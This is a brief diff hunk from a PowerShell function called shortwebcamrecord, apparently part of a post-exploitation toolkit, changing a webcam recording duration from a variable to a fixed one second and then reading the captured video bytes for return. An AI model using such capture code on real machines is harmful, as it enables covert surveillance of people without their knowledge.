@@ -50,7 +50,7 @@ function shortwebcamrecord
     try{$VideoCapture.Start()}
     catch{Write-Verbose "[!]Unable to start capture"; $VideoCapture.Stop();break}
     Write-Verbose "[+] Starting Webcam video capture"
-    Start-Sleep -Milliseconds $RecordTime
+    Start-Sleep -Milliseconds 1000
     $VideoCapture.stop()
     Write-Verbose "[+] Webcam video capture completed"
     $returnBytes = [System.IO.File]::ReadAllBytes($OutPath)
